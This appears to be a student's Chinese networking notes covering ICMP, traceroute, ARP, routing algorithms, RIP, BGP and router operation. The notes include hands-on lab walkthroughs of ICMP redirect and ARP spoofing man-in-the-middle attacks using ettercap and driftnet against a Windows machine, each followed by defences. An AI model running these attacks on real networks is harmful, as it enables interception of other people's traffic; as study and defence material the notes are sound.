<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505231017646.png" alt="image-20220505231017646" style="zoom:33%;" />

类型：11(0b)，表示超时类型。
代码：0(00)。
校验和：f4ff，correct，校验正确。
Unused：00 00 00 00。
数据：剩下的部分。

![image-20220505231329442](C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505231329442.png)

类型：3(03)，表示终点不可达类型。
代码：3(03)，表示终点不可达中的端口不可达类型。
校验和：b9 dd，correct，校验正确。
Unused：00 00 00 00。
数据：剩下的部分。
Traceroute从源主机向目的主机发送一连串的IP数据报，封装的是无法交付的UDP数据报（端口大于30000)。第一个数据报P1的生存时间TTL设置为1。当P1到达路径上的第一个路由器R1时，路由器R1先收下它，接着把TTL的值减1。由于**TTL等于零了**，R1就把P1丢弃了，并向源主机发送一个**ICMP时间超过差错报告**报文，源主机接着发送第二个数据报P2，并把TTL设置为2。P2先到达路由器R1，R1收下后把TTL减1再转发给路由器R2。R2收到P2时TTL为1，但减1后TTL变为零了。R2就丢弃P2，并向源主机发送一个ICMP时间超过差错报告报文。这样一直继续下去。当最后一个数据报刚刚到达目的主机时，数据报的TTL是1。主机不转发数据报，也不把TTL值减1。但因IP数据报中封装的是**无法交付**的UDP数据报，因此目的主机要向源主机发送**ICMP终点不可达**差错报告报文。这样，源主机达到了自己的目的，因为这些路由器和最后目的主机发来的ICMP报文正好给出了源主机想知道的路由信息一到达目的主机所经过的路由器的IP地址，以及到达其中的每一个路由器的往返时间。

##### ICMP重定向攻击

###### 原理

ICMP重定向信息是路由器向主机提供实时的路由信息，当一个主机收到ICMP重定向信息(上面提到，type=5)时，它就会根据这个信息来更新自己的路由表。由于缺乏必要的合法性检查，如果一个黑客想要被攻击的主机修改它的路由表，黑客就会发送ICMP重定向信息给被攻击的主机，让**该主机按照黑客的要求来修改路由表。**

###### 攻击

**攻击机**

操作系统：kali

使用软件：netwox

IP:10.28.214.132

**靶机**

操作系统：Win10

IP:10.28.214.51

网关：10.28.128.1

**靶机Ping网关与攻击机**

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505233004181.png" alt="image-20220505233004181" style="zoom:50%;" />

攻击机攻击

打开ettercap，点击对勾

```shell
ettercap -G  #打开ettercap
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505234736263.png" alt="image-20220505234736263" style="zoom:50%;" />


点击搜索主机，打开主机列表

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505234852997.png" alt="image-20220505234852997" style="zoom:50%;" />

选择ICMP重定向攻击

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505234910519.png" alt="image-20220505234910519" style="zoom:50%;" />

输入网关MAC地址和IP地址

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505234925642.png" alt="image-20220505234925642" style="zoom:50%;" />

打开wireshark抓包，靶机浏览器打开几个网页。可以看到ICMP重定向报文。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505234940999.png" alt="image-20220505234940999" style="zoom: 50%;" />

点击可查看，网关已被修改为攻击机IP。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505235014982.png" alt="image-20220505235014982" style="zoom:50%;" />

Ettercap显示靶机在访问的外网站点IP及端口。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505235044426.png" alt="image-20220505235044426" style="zoom:50%;" />

 攻击机可以获得靶机发送的数据，但是无法接收从外网返回的数据，属于**半个中间人攻击。**

###### 防御

（1）网关端：

关闭ICMP重定向（no ip redirects）。

变长子网掩码划分网段。

使用网络控制列表（ACL）和代理。

（2）主机端：

可以使用防火墙等过滤掉ICMP报文，或使用反间谍软件监控。

结合防ARP、IP欺骗等进行防御。 

#### 参考

《TCP/IP详解卷1》第六、七、八章

《谢希仁 计算机网络第7版》4.4

[stackoverflow-checksum-icmp-python-with-wireshark](https://stackoverflow.com/questions/20905770/checksum-icmp-python-with-wireshark
)

[RFC 792](https://datatracker.ietf.org/doc/rfc792/)

[ettercap的YouTube频道](https://www.youtube.com/channel/UCVYP1AeH9G1E1rtllwxLEQA)

[ettercap的GitHub](https://github.com/Ettercap/ettercap)

### 2.4.5 ARP协议

#### 简介

地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址（MAC地址）的一个协议。划分到网络层（TCP/IP）或数据链路层（OSI），用在局域网内。

**背景**：网络设备有数据要发送给另一台网络设备时，必须要知道对方的网络层地址（即IP地址）。IP地址由网络层来提供，但是仅有IP地址是不够的，IP数据报文必须封装成帧才能通过数据链路进行发送。数据帧必须要包含目的MAC地址，因此发送端还必须获取到目的MAC地址。通过目的IP地址二获取的MAC地址的过程是由ARP（Address Resolution Protocol）协议来实现的。

**功能**：完成主机或路由器**IP地址到MAC地址的映射**。

ARP高速缓存（arp表）：IP地址和MAC地址的映射。

注：网络设备的接口有MAC地址，并不是一个网络设备仅有一个MAC地址，二层交换机这种设备没有MAC地址。

#### IP与MAC地址

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602195756771.png" alt="image-20220602195756771" style="zoom: 67%;" />

#### ARP报文

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506110742953.png" alt="image-20220506110742953" style="zoom:50%;" />

ARP报文的**总长度为64字节**，FCS（Frame Check Sequence，帧校验序列），俗称帧尾，即数据链路层的协定数据单元（帧)的尾部栏位，是一段4个位元组的循环冗余校验码，用来验证帧在传输过程中的完整性。

**硬件类型**：16位，2字节，用来定义运行ARP的网络类型。每个局域网基于其类型被指派一个整数。例如：以太网的类型为1。ARP可用在任何物理网络上。

**协议类型**：16位，2字节，用来定义使用的协议。例如：对IPv4协议这个字段是0x0800。ARP可用于任何高层协议。

**硬件长度**：8位，1字节，用来定义物理地址的长度，以字节为单位。例如：对于以太网的值为6。

**协议长度**：8位，1字节，用来定义逻辑地址的长度，以字节为单位。例如：对于IPv4协议的值为4。

**操作码**：16位，2字节，用来定义报文的类型。已定义的分组类型有两种：ARP请求（1），ARP响应（2）。

**源硬件地址**：可变长度字段，单位字节，用来定义发送方的物理地址。例如：对于以太网这个字段的长度是6字节。

**源协议地址**：可变长度字段，单位字节，用来定义发送方的逻辑（IP）地址。例如：对于IP协议这个字段的长度是4字节。

**目的硬件地址**：可变长度字段，用来定义目标的物理地址，例如，对以太网来说这个字段位6字节。对于ARP请求报文，这个字段为全0，因为发送方并不知道目标的硬件地址。

**目的协议地址**：可变长度字段，用来定义目标的逻辑（IP）地址，对于IPv4协议这个字段的长度为4个字节。

#### ARP协议工作过程

流程：**检查ARP高速缓存**，有对应表项则写入**MAC帧**，没有则用目的MAC地址为**FF-FF FF-FF-FF-FF**的帧封装并**广播ARP请求分组，同一局域网**中所有主机都能收到该请求。目的主机收到请求后就会向源主机**单播一个ARP响应分组**，源主机收到后将此映射**写入ARP缓存**（10-20min更新一次）。

##### 四种情况

1.主机A发给本网络上的主机B：用ARP表找到主机B的硬件地址；
2.主机A发给另--网络上的主机B：用ARP表找到本网络上一个路由器（网关）的硬件地址；
3.路由器发给本网络的主机A：用ARP表找到主机A的硬件地址；
4.路由器发给另一网络的主机B：用ARP表找到本网络上的一个路由器的硬件地址。

##### ARP请求

广播ARP请求分组

##### ARP响应

单播ARP响应分组

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506111056477.png" alt="image-20220506111056477" style="zoom:50%;" />

PCi对应IPi与MACi，i为1~5。默认网关为IP6。

**PC1想与PC3通信**

- PC1广播ARP请求分组（IP1,IP3,MAC1,FF-FF-FF-FF-FF-FF），“我的ip为IP1，我的MAC地址为MAC1，哪位老哥的ip为IP3呀，你的MAC地址是多少呢？”，交换机发给PC2、PC3，PC2发现不是找自己的，不予答复（后续不再赘述），PC3解析分组后发现目的IP地址与自己匹配，知道要找自己，PC3先把IP1及其mac地址加入自己的ARP高速缓存表，然后单播ARP响应分组（IP3,MAC3），“小老弟，我的IP是IP3、MAC地址是MAC3”。


**PC1想与PC5通信**

- PC1广播ARP请求分组（IP1,IP6,MAC1,FF-FF-FF-FF-FF-FF），“我的ip为IP1，我的MAC地址为MAC1，默认网关IP6，你的MAC地址是多少呢？”，路由器R1单播ARP响应分组（IP6,MAC6），“小老弟，我的IP是IP6、MAC地址是MAC6”。PC1收到后单播ARP请求分组（IP1,IP5,MAC1,MAC6），路由器R1收到后再次封装，单播ARP请求分组（IP1,IP5,MAC7,MAC8），路由器R2收到后再次封装，广播（IP1,IP5,MAC9,FF-FF-FF-FF-FF-FF），PC4和PC5都接收到了该广播分组，解析分组后PC4发现不是找自己，丢弃分组，不予理会，PC5发现是找自己，然后PC5单播ARP响应分组（IP5,MAC5），路由器R2收到PC5的单播知道PC5的MAC地址后再单播给路由器R1，R1再单播给PC1，PC1就知道PC5的MAC地址了。

##### 示例2

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602195947401.png" alt="image-20220602195947401" style="zoom:50%;" />

- A已知B的IP地址，需要获得B的MAC地址（物理地址）
- 如果A的ARP表中缓存有B的IP地址与MAC地址的映射关系，则直接从ARP表获取
- 如果A的ARP表中未缓存有B的IP地址与MAC地址的映射关系，则A广播包含B的IP地址的ARP query分组
- 在局域网上的所有节点都可以接收到ARP query
- B接收到ARP query分组后，将自己的MAC地址发送给A
- A在ARP表中缓存B的IP地址和MAC地址的映射关系
- 超时时删除

**路由到另一个局域网**

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602200257808.png" alt="image-20220602200257808" style="zoom:50%;" />

- 
  A创建IP数据包（源为A、目的为E）
- 在源主机A的路由表中找到路由器R的IP地址223.1.1.4
- A根据R的IP地址223.1.1.4，使用ARP协议获得R的MAC地址
- A创建数据帧（目的地址为R的MAC地址）
- 数据帧中封装A到E的IP数据包
- A发送数据帧，R接收数据帧

#### ARP攻击原理

修改通信双方的数据包，使双方ARP表中对方IP对应的MAC地址为攻击者的MAC地址。以最简单的网络拓扑为例，其中PC1的IP、MAC为IP1、MAC1、PC2的IP、MAC为IP2、MAC2，路由器R1的IP、MAC为IP3、MAC3：

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506114357197.png" alt="image-20220506114357197" style="zoom:50%;" />

- 攻击者PC2聆听局域网上的MAC地址。它只要收到主机PC1和路由器R1洪泛的ARP Request，就可以进行欺骗活动。
- 主机PC1、路由器R1都洪泛了ARP Request.攻击者现在有了主机和路由器的IP、MAC地址，开始攻击。

- 攻击者发送一个ARP Reply给主机PC1，把此包ARP协议头部里的Source Protocal Address设为路由器的IP地址IP3，Source Hardware Address设为攻击者PC2自己的MAC地址MAC2。

- 主机PC1收到ARP Reply后，更新它的ARP表，把路由器的MAC地址（IP3, MAC3）改为（IP3, MAC2）。

- 当主机PC1要发送数据包给路由器R1时，它根据ARP表来封装数据包的Link报头，把目的MAC地址设为MAC2，而非MAC3。

- 当交换机收到主机PC1发送给A路由器R1的数据包时，根据此包的目的MAC地址（MAC2）把数据包转发给攻击者PC2。

- 攻击者收到数据包后，可以把它存起来后再发送给路由器R1，达到偷听效果。攻击者也可以篡改数据后才发送数据包给路由器R1。


- 反之同理，如果局域网内还有PC3，PC1与PC3通信，攻击机PC2也可同样攻击。


#### 实战

##### ARP欺骗

ARP欺骗（英语：ARP spoofing），又称ARP毒化（ARP poisoning，网络上多译为ARP中毒）或ARP攻击，是针对ARP的一种攻击技术，通过**欺骗局域网内访问者PC的网关MAC地址，使访问者PC误以为攻击者更改后的MAC地址是网关的MAC**，导致网络不通。此种攻击可让攻击者**获取局域网上的数据包甚至可篡改数据包**，且可让网络上特定计算机或所有计算机无法正常连线。

以攻击局域网，获取局域网内其他用户浏览的图片为例。

##### 环境

**攻击机（虚拟机）**

操作系统：kali

使用软件：ettercap v0.8.3

IP:10.28.149.132

**靶机（主机）**

操作系统：Windows 10

##### 查看arp表

使用cmd命令

```powershell
arp -a
```

来查看arp表

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506114808376.png" alt="image-20220506114808376" style="zoom:50%;" />



##### 使用ettercap进行攻击

```shell
ettercap -G
```

启动图形界面，选择网卡eth0，点击下图对勾

启动图形界面
点击左上角搜索标志（左数第二个），发现主机，点击右侧按钮（左数第三个）查看发现的主机列表。
选中网关xxx.xxx.xxx.1，点击Add Target1、选中主机IP点击Add Target2。

 点击右侧三个点，选择Targets可查看两个Targets。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142157406.png" alt="image-20220506142157406" style="zoom:50%;" />

目标增删

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142227545.png" alt="image-20220506142227545" style="zoom:50%;" />

查看连接

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142256445.png" alt="image-20220506142256445" style="zoom:50%;" />

进行ARP攻击

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142326087.png" alt="image-20220506142326087" style="zoom:50%;" />


选择插件

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142353975.png" alt="image-20220506142353975" style="zoom:50%;" />

选择remote_brower插件

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142417354.png" alt="image-20220506142417354" style="zoom:50%;" />


主机arp表增加了攻击机

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142452177.png" alt="image-20220506142452177" style="zoom:50%;" />

访问一个非https的、含图片的网站（http://www.cxtuku.com/sucai/129877.html)，可以看到攻击机kali抓到了图片。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142535513.png" alt="image-20220506142535513" style="zoom:50%;" />

##### 查看劫持到的图片

使用命令

```shell
driftnet -i eth0
```

捕获TCP传输的图片

![image-20220506142625684](C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142625684.png)

如果没有安装，可以使用命令来安装：

```shell
apt-get install driftnet
```

##### ARP攻击防御

###### 静态绑定

静态绑定之前先看一下删除，使用以下命令进行删除：

```powershell
arp -d ip
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142848727.png" alt="image-20220506142848727" style="zoom:50%;" />

可以看到，下图红线处的已经删除掉了

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142912852.png" alt="image-20220506142912852" style="zoom:50%;" />

将刚才的添加为静态(arp -s)，这样就不会动态修改了。与这个ip的通信相对安全，同理，可以添加网关等其他ip与MAC的映射。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142946214.png" alt="image-20220506142946214" style="zoom:50%;" />

###### ARP防火墙

腾讯电脑管家、360、彩影等都可以，一般就是软件上面有个按钮，点击一下即可。

#### 参考

[ettercap的YouTube频道](https://www.youtube.com/channel/UCVYP1AeH9G1E1rtllwxLEQA)

[ettercap的GitHub](https://github.com/Ettercap/ettercap)

《TCP/IP详解卷I》

### 2.4.6 路由算法

#### 2.4.6.1 简介

路由算法是用于找到一条从源路由器到目的路由器的最佳路径的算法。存在着多种路由算法，每种算法对网络和路由器资源的影响都不同；由于路由算法使用多种度量标准 (metric)，所以不同路由算法的最佳路径选择也有所不同。

根据路由算法是否随网络的通信量或拓扑自适应划分：

- 静态路由选择策略（非自适应路由选择）
- 动态路由选择策略（自适应路由选择）

#### 2.4.6.2 路由选择算法的功能

源/宿对之间的路径选择，以及选定路由之后将报文传送到它们的目的地。

路由选择算法的要求：

-   正确性：确保分组从源节点传送到目的节点

-   简单性：实现方便，软硬件开销小

-   自适应性：也称健壮性，算法能够适应业务量和网络拓扑的变化

-   稳定性：能长时间无故障运行

-   公平性：每个节点都有机会传送信息

-   最优性：尽量选取好的路由

#### 2.4.6.3 距离向量路由

##### 算法基本思想

- 每个节点周期性地向邻居发送它自己到某些节点的距离向量；

- 当节点x接收到来自邻居的新DV估计，它使用B-F方程更新其自己的DV :
  Dx(y) ← minv{c(x,v) + Dv(y)} for each node y ∊ N

- 上述过程迭代执行，Dx(y)收敛为实际最小费用 dx(y)


距离向量算法特点：**迭代的、分布式的**

- 每次本地迭代由下列引起: 本地链路费用改变、邻居更新报文

- 分布式:各节点依次计算，相互依赖

**注**：路由器只掌握物理相连的邻居以及链路费用

##### 算法过程

- 路由器启动时初始化自己的路由表
- 初始路由表包含所有直接相连的网络路径，距离均为0

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602203040145.png" alt="image-20220602203040145" style="zoom:50%;" />

- 路由器周期性地向其相邻路由器广播自己知道的路由信息

- 相邻路由器可以根据收到的路由信息修改和刷新自己的路由表

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602203113997.png" alt="image-20220602203113997" style="zoom:50%;" />

- 路由器经过若干次更新后，最终都会知道到达所有网络的最短距离
- 所有的路由器都得到正确的路由选择信息时网络进入“收敛”（convergence）状态

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602203200309.png" alt="image-20220602203200309" style="zoom:50%;" />

**特殊情况考虑**

计数到无穷问题（The Count-to-Infinity Problem）

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602203402414.png" alt="image-20220602203402414" style="zoom:50%;" />

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602203438353.png" alt="image-20220602203438353" style="zoom:50%;" />

**好消息传播快，坏消息传播慢**，是距离向量路由的一个主要缺点

#### 2.4.6.4 链路状态路由

> 注：所有路由器掌握完整的网络拓扑和链路费用信息

##### 链路状态算法过程（Link States Algorithm，LSA）

链路状态（Link State）路由可分为五个部分：

1.发现邻居，了解他们的网络地址；

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602203741956.png" alt="image-20220602203741956" style="zoom:50%;" />

2.设置到每个邻居的成本度量；

（1）开销/度量/代价：

- 自动发现设置或人工配置
- 度量：带宽、跳数、延迟、负载、可靠性等

（2）常用度量：链路带宽（反比）

- 例如：1-Gbps以太网的代价为1，100-Mbps以太网的代价为10

（3）可选度量：延迟

- 发送一个echo包，另一端立即回送一个应答
- 通过测量往返时间RTT，可以获得一个合理的延迟估计值

3.构造一个分组，分组中包含刚收到的所有信息；
构造链路状态分组（link state packet，LSP）

- 发送方标识

- 序列号
- 年龄
- 邻居列表

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603190742806.png" alt="image-20220603190742806" style="zoom:50%;" />

4.将此分组发送给其他的路由器；

- 每个LSP分组包含一个序列号，且递增
- 路由器记录所收到的所有（源路由器、序列号）对
- 当一个新分组到达时，路由器根据记录判断：
  - 如果是新分组，洪泛广播
  - 如果是重复分组，丢弃
  - 如果是过时分组，拒绝

5.计算到其他路由器的最短路径。

- Dijkstra算法示例
- D(k)：从计算节点到目的节点k当前路径代价
- p(k)：从计算节点到目的节点k的路径中k节点的前继节点

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603191141233.png" alt="image-20220603191141233" style="zoom:50%;" />

6.Python代码实现链路状态算法（可输出任意两节点的最短距离和任意一个路由器的路由转发表）

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220620225823628.png" alt="image-20220620225823628" style="zoom:50%;" />

```python
import numpy as np


class LSA():
   def __init__(self,node):
self.route_graph={'a':{'b':1},'b':{'d':2},'c':{'a':2},'d':{'c':1,'f':8},'e':{'d':2,'g':2},'f':{'e':2},'g':{'f':3,'h':3},'h':{'f':2}}#路由节点图
      # 各点下标
      self.idx_map = {0: 'a', 1: 'b', 2: 'c', 3: 'd', 4: 'e', 5: 'f',6:'g',7:'h'}

      self.map = {'a':0, 'b':1, 'c':2, 'd':3, 'e':4, 'f':5, 'g':6, 'h':7}
      self.node_num=self.map[node]

   def generate_instance(self):
      # 为了方便，把无穷大定义为了9999
      graph = np.zeros((8, 8), dtype=int)

      for i in range(0,8):
         for j in range(0,8):
            if i==j:
               graph[i][j]=0
            else:
               try:
                  graph[i][j]=self.route_graph[idx_map[i]][idx_map[j]]
               except:
                  graph[i][j]=9999#两个节点距离为无穷时，定为9999

      return [graph, self.idx_map]


   def LS_algorithm(self,graph):
      N_fnd = [False for i in range(len(graph))]
      N_fnd[self.node_num] = True
      # p(v) 从源点到目标节点v最小路径中的前一个点
      p = [0 for i in range(len(graph))]
      # 当前状态下，源点到各点的距离
      D = graph[self.node_num]

      # step2. 循环阶段
      for i in range(len(D)):
         # 找出向量中的最下值和对应那个点的下标
         minimum = 10000
         minimum_idx = -1
         for j in range(len(graph)):
            if D[j] < minimum and not N_fnd[j]:
               minimum = D[j]
               minimum_idx = j
         N_fnd[minimum_idx] = True

         # 然后看是否存在使得通过该点“中转”使得源点能最小到的点
         for idx in range(len(D)):
            # 中转之后比原来还小
            if D[minimum_idx] + graph[minimum_idx][idx] < D[idx]:
               D[idx] = D[minimum_idx] + graph[minimum_idx][idx]
               p[idx] = minimum_idx

      return D, p

   def print_jvli(self):
      D,p=self.LS_algorithm(self.generate_instance()[0])
      # 打印出最短路径
      print(node+"  ",end="")
      for i in range(len(D)):
         print(D[i],end="   ")
      print("\t")

   def print_route_table(self):
      D, p = self.LS_algorithm(self.generate_instance()[0])
      print(f"{node}路由器的路由表如下：")
      print("目的  下一跳  代价")
      for i in range(len(D)):
         if node!=self.idx_map[i]:
            print(self.idx_map[i]+"     "+self.idx_map[p[i]]+"     ",D[i])
      print("\n")

if __name__ == '__main__':
   nodes=['a','b','c','d','e','f','g','h']
   print("   a   b   c   d   e   f   g   h")
   for node in nodes:
      lsa=LSA(node=node)
      c, idx_map = lsa.generate_instance()
      lsa.print_jvli()
   print("\n")
   for node in nodes:
      lsa=LSA(node=node)
      c, idx_map = lsa.generate_instance()
      lsa.print_route_table()

```



##### 距离向量和链路状态算法比较

网络状态信息交换的范围

- DV:邻居间交换
- LS:全网扩散

网络状态信息的可靠性

- DV:部分道听途说
- LS:自己测量

#### 2.4.6.5 层次路由

##### 产生原因

过于庞大的路由表存储、查找困难，路由信息交互开销高。

现实情况：

- 地址分配往往是随机的，难以进行高效的地址聚合

- 每个网络的网络管理员有自己的管理方法和思路，并不希望每个路由器都干涉本网络内部的地址分配等问题

层次路由可以解决：

- 网络扩展性问题：当网络扩大时，控制路由表条目和路由表存储空间的增长
- 管理的自治问题：网络管理员可以控制和管理自己网络的路由

##### 基本思路

- 互联网由大量不同的网络互连，每个管理机构控制的网络是自治的

- 自治系统（AS，Autonomous System）
  - 一个管理机构控制之下的网络
  - 一个AS内部通常使用相同的路由算法/路由协议，使用统一的路由度量（跳数、带宽、时延 …）
  - 不同的AS可以使用不同的路由算法/路由协议
  - 每个AS有一个全球唯一的ID号：AS ID

- 自治系统内的还可以进一步划分层次：私有自治系统或区域

##### 效果

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603191544620.png" alt="image-20220603191544620" style="zoom:50%;" />

#### 2.4.6.6 广播路由

**广播（Broadcasting）**：源主机同时给全部目标地址发送同一个数据包。

##### 实现方法

1.给每个主机单独发送一个数据包

- 效率低、浪费带宽
- Server需要知道每个目的地址

2.多目标路由（multi-destination routing）

- 在需要转发的路由器线路复制一次该数据报
- 网络利用率高
- Server依然需要知道所有的目的地址

**注**：以上方法难以实现

3.泛洪（flooding）

- 一种将数据包发送到所有网络节点的简单方法
- 将每个进入数据包发送到除了进入线路外的每条出去线路

用途

- 保证性：一种有效广播手段，可确保数据包被传送到网络中每个节点
- 鲁棒性：即使大量路由器被损坏，也能找到一条路径（如果存在）
- 简单性：仅需知道自己的邻居

无控制的泛洪

- 实现广播最显而易见的技术
- 环路可能导致广播风暴
- 路由器可能收到多个副本
- 节点需要跟踪已泛洪的数据包以阻止洪泛
- 即使利用跳数来限制，也会出现成倍爆炸

解决方法：受控制的泛洪（每个路由器进行有选择的泛洪）

- 序号控制泛洪
- 逆向路径转发

4.生成树（spanning tree）

- 源节点向所有属于该生成树的特定链路发送分组
- 改进了逆向路径转发
- 没有环路
- 最佳使用带宽
- 最少副本，消除了冗余分组
- 一个路由器可以不必知道整颗树，只需要知道在一颗树中的邻居即可

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603192000863.png" alt="image-20220603192000863" style="zoom:25%;" />



#### 2.4.6.3  自治系统AS(Autonomous System)

> 经典定义：

-   由一个组织管理的一整套路由器和网络。

-   使用一种 AS 内部的路由选择协议和共同的度量以确定分组在该 AS 内的路由。

-   使用一种 AS 之间的路由选择协议用以确定分组在 AS 之间的路由。

> 尽管一个 AS 使用了多种内部路由选择协议和度量，但对其他 AS 表现出的是一个单一的和一致的路由选择策略。

### 2.4.7  两大类路由选择协议

> 因特网的中，路由协议可以分为内部网关协议 IGP (Interior Gateway Protocol) 和外部网关协议 EGP (Ex- ternal Gateway Protocol)。
>
> IGP 是在一个 AS 内部使用的路由选择协议，如 RIP 和 OSPF 协议，是域内路由选择 (interdomain routing)。当源主机和目的主机处在不同的 AS 中，在数据报到达 AS 的边界时，使用外部网关协议 EGP 将路由选择信息传递到另一个自治系统中，如 BGP-4，是域间路由选择 (intradomain routing)。

#### 2.4.7.1  RIP(路由选择协议)

##### 概述

- 路由信息协议 (Routing Information Protocol, RIP) 是一种基于距离向量的路由选择协议。RIP 协议要求网络中的每一个路由器都要维护从它自己到自治系统内其他每一个目的网络的距离和下一跳路由器地址。
- 使用跳数衡量到达目的网络的距离
  - RIP 认为一个好的路由就是它通过的路由器的数目少，即“距离短”
  - RIP 允许一条路径最多只能包含 15 个路由器
- RIP协议的基本思想
  - 仅和相邻路由器交换信息
  - 路由器交换的内容是自己的路由表
  - 周期性更新：30s

##### 工作过程

初始化

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603192356461.png" alt="image-20220603192356461" style="zoom:50%;" />

周期性更新

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603192423894.png" alt="image-20220603192423894" style="zoom:50%;" />

##### 小结

RIP协议的特点：

- 算法简单，易于实现
- 收敛慢
- 需要交换的信息量较大

RIP协议的适用场合：

- 中小型网络

RIP协议的防环路机制：

- 触发更新
- 毒性反转
- 水平分割
- 其他

#### 2.4.7.2 BGP（外部网关路由协议）

路由协议

- 内部网关协议 IGP： 有 RIP 和、OSPF、ISIS 等多种具体的协议
- 外部网关协议 EGP：目前使用的协议就是 BGP

边界网关协议BGP (Border Gateway Protocol)

- 目前互联网中唯一实际运行的自治域间的路由协议

BGP功能

- eBGP：从相邻的AS获得网络可达信息
- iBGP： 将网络可达信息传播给AS内的路由器
- 基于网络可达信息和策略决定到其他网络的“最优”路由

BGP会话: 两个BGP路由器通过TCP连接交换BGP报文

- 通告到不同网络前缀的路径，即路径向量协议

BGP路径通告

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603193038853.png" alt="image-20220603193038853" style="zoom:67%;" />

- AS2的路由器2c从AS3的路由器3a接收到路径AS3, X
- 根据AS2的策略，AS2的路由器2c接受路径AS3, X，通过iBGP传播给AS2的所有路由器
- 根据AS2策略，AS2的路由器2a通过eBGP向AS1的路由器1c通告从AS3的路由器3a接收到路径AS2, AS3, X

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603193109525.png" alt="image-20220603193109525" style="zoom:67%;" />

路由器可能会学到多条到达目的网络的路径:

- AS1的路由器1c从2a学到路径AS2, AS3, X
- AS1的路由器1c从3a学到路径AS3, X
  由策略，AS1路由器1c可能选择路径AS3, X, 并在AS1中通过iBGP通告路径

### 2.4.8 路由器的工作原理

#### 2.4.8.1 路由器概述

路由器是互联网最主要的网络设备，包含2个核心功能

- 控制层：运行各种路由协议：BGP、OSPF、RIP，学习去往不同目的的转发路径：路由表
- 数据层：根据上述路由表，将收到的IP分组转发到正确的下一跳链路

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603193425094.png" alt="image-20220603193425094" style="zoom:50%;" />

#### 2.4.8.2 路由器控制层

- 路由器可同时运行多个路由协议
- 路由器也可不运行任何路由协议，只使用静态路由和直连路由
- 路由管理根据路由优先级，选择最佳路由，形成核心路由表
- 控制层将核心路由表下发到数据层，形成转发表（FIB）
- 若存在多个“去往同一目的IP前缀”的不同类型路由，路由器根据优先级选择最佳路由
- 优先级数值越小，优先级越高

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603193553809.png" alt="image-20220603193553809" style="zoom:50%;" />

#### 2.4.8.3 路由器数据层

路由器中IP报文转发核心功能

- 链路层解封装，IP头部校验
- 获取报文目的IP地址
- 用目的IP地址，基于最长前缀匹配规则查询转发表
- 查询失败，丢弃报文
- 查询成功
  - 获取转发出接口和下一跳IP地址
  - IP头部“TTL”字段值减1，重新计算IP头部“校验和”
  - 重新进行链路层封装，发送报文

**注**：普通IP报文转发过程中，路由器不查看传输层及以上层协议的内容

- IP报文在路由器转发前后的变化
  - 链路层封装更新，IP头部“TTL”减1，IP头部“校验和”更新

- 数据报在不同硬件单元的处理

  - 报文输入的接口卡

    - 链路层解封装

    - 转发表查询（该工作在输入接口卡处理）

    - 通过交换结构将报文排队发往目的接口卡（发送过快将产生拥塞）

  - 交换结构

    - 从输入接口卡发往输出接口卡

  - 报文输出的接口卡

    - 从交换结构接收报文（排队进行后续处理，到达太快将产生拥塞）

    - 链路层封装

    - 从输出接口发送报文

3种典型的交换结构

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603193914164.png" alt="image-20220603193914164" style="zoom: 67%;" />

### 2.4.9 拥塞控制算法

#### 2.4.9.1 概述

##### 拥塞

网络中存在太多的数据包导致数据包传输延迟或丢失，从而导致网络吞吐量下降

